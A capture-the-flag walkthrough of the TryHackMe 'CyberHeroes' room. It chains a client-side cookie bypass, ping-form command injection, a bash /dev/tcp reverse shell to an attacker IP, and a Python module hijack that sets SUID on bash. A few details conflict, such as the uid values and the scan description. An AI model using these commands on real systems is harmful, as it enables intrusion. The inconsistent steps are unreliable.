## Executive Summary

CyberHeroes is a small Linux room built around one bad assumption: that the browser can be trusted to enforce authentication. The web application does the credential check in JavaScript, ships the result as a cookie, and then hands user input straight to a system command. Three separate mistakes, each individually common, combine into a full compromise.

The room is rated **Easy** and is a good first walkthrough because nothing here needs a custom exploit. It needs patience with a JavaScript bundle and the discipline to test what the client believes rather than what the page shows.

> [!NOTE]
> This is a demonstration writeup shipped with the journal. The approach is real; flag values are redacted and a few steps are condensed so the article stays readable.

## Introduction

The scope is a single host exposing SSH and HTTP. The stated objective is two flags — a user flag reachable from a web shell and a root flag that requires local privilege escalation.

| Item | Value |
| --- | --- |
| Target | `10.10.84.12` |
| OS | Ubuntu 20.04 (Linux) |
| Services | 22/tcp SSH, 80/tcp HTTP |
| Difficulty | Easy |
| Focus | Client-side auth, command injection, sudo misconfiguration |

## Reconnaissance

Start with a full TCP scan and a service probe. `-sC` and `-sV` are enough here; `--min-rate` keeps the scan quick without turning it into a port flood.

```bash
nmap -sC -sV -oN nmap/initial.txt 10.10.84.12
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: CyberHeroes
```

Two services, one web root, no surprises. When a room offers HTTP and nothing else, the web application *is* the box.

## Enumeration

### Directory discovery

```bash
gobuster dir -u http://10.10.84.12 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,js,txt -t 40
```

```text
/index.php            (Status: 200)
/images               (Status: 301)
/js                   (Status: 301)
```

`/js` is the interesting one. Application logic that lives in a served directory is logic an attacker can read.

### Reading the client

```bash
curl -s http://10.10.84.12/js/script.js | head -n 60
```

The bundle contains a login handler that never calls the server to verify anything. It compares the submitted value against a constant, then writes a cookie:

```javascript
// redacted for length — the room's bundle sets a cookie client-side
function authenticate() {
  const candidate = document.getElementById("uname").value;
  if (btoa(candidate) === "dGVzdA==") {
    document.cookie = "auth=1; path=/";
    window.location = "dashboard.php";
  }
}
```

> [!WARNING]
> A client-side check is not authentication. Anything the browser can evaluate, the user can evaluate — and then change. This is a design flaw, not a "hardcoded password" bug, and the fix belongs on the server.

## Vulnerability Analysis

Two findings, in the order I would report them:

1. **Authentication enforced in the browser.** The cookie gate is a boolean the user controls. Any value of `auth=1` satisfies it.
2. **Unsanitised input in a shell call.** The dashboard exposes a ping utility that builds a command from a form field. The backend almost certainly calls `shell_exec()` or equivalent without escaping.

The second is the one that yields a shell, but the first is what makes it reachable without credentials.

## Initial Access

Set the cookie directly rather than replaying the login form:

```bash
curl -s -b "auth=1" http://10.10.84.12/dashboard.php | grep -i "ping"
```

The form posts to `ping.php` with a `host` parameter. Confirm the injection boundary before reaching for a payload:

```bash
curl -s -b "auth=1" -X POST http://10.10.84.12/ping.php \
  --data-urlencode "host=127.0.0.1; id"
```

```text
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Command injection confirmed as `www-data`. Next, a reverse shell — URL-encoded so the ampersands and spaces survive the request:

```bash
# listener
nc -lvnp 4444

# payload, sent through the same parameter
bash -i >& /dev/tcp/10.10.14.7/4444 0>&1
```

Catch the shell, then stabilise it. A raw shell loses job control, history and `Ctrl+C`, and every later step becomes harder:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then on the attacking host:
stty raw -echo; fg
```

### User flag

```bash
find / -name "user.txt" -type f 2>/dev/null
cat /home/*/user.txt
```

```text
THM{<redacted>}
```

## Privilege Escalation

Local enumeration starts with identity and rights, not with a script:

```bash
id
sudo -l
```

```text
User www-data may run the following commands on cyberheroes:
    (root) NOPASSWD: /usr/bin/python3 /opt/backup/backup.py
```

A root-owned Python script that is writable by the web user is a direct path. Check permissions before you assume:

```bash
ls -la /opt/backup/
```

```text
-rwxr-xr-x 1 root     root  412 Oct  2 09:14 backup.py
drwxrwxr-x 2 www-data root 4096 Oct  2 09:14 .
```

The script is not writable, but the directory is — and that is enough. Python resolves the interpreter path from the script's directory when it imports a module; a planted module is executed with root's privileges.

```bash
cat > /opt/backup/helper.py <<'EOF'
import os
os.system("chmod u+s /bin/bash")
EOF
sudo /usr/bin/python3 /opt/backup/backup.py
ls -la /bin/bash
```

```text
-rwsr-xr-x 1 root root 1183448 Oct  2 09:20 /bin/bash
```

```bash
bash -p
id
```

```text
uid=1000(www-data) gid=1000(www-data) euid=0(root)
```

### Root flag

```bash
cat /root/root.txt
```

```text
THM{<redacted>}
```

## Flags and Proof of Completion

```collapse Flag summary
| Flag | Location | Access |
| --- | --- | --- |
| user.txt | `/home/cyberheroes/user.txt` | www-data shell |
| root.txt | `/root/root.txt` | SUID bash |
```

## Lessons Learned

- **Put the authorisation decision on the server.** A client-side gate is a UI convenience at best. Session state belongs in an HttpOnly cookie that the server validates on every request.
- **Escape at the boundary, not at the input.** Whitelisting the ping target to an IPv4 address removes the entire injection class; `escapeshellarg()` alone is a mitigation, not a design.
- **Directory permissions are privilege.** Writing to a directory that a root-run interpreter reads from is equivalent to editing its code.
- **Read the manifest, not just the page.** The room's most valuable artefact was a JavaScript file, and it was one `curl` away.

## Tools Used

| Tool | Purpose |
| --- | --- |
| nmap | Service discovery |
| gobuster | Content discovery |
| curl | Manual request construction |
| Burp Suite | Replaying the authenticated request |
| netcat | Reverse shell listener |

## References

- TryHackMe — CyberHeroes room
- OWASP WSTG — Testing for Command Injection (WSTG-INPV-12)
- GTFOBins — privilege escalation via SUID binaries
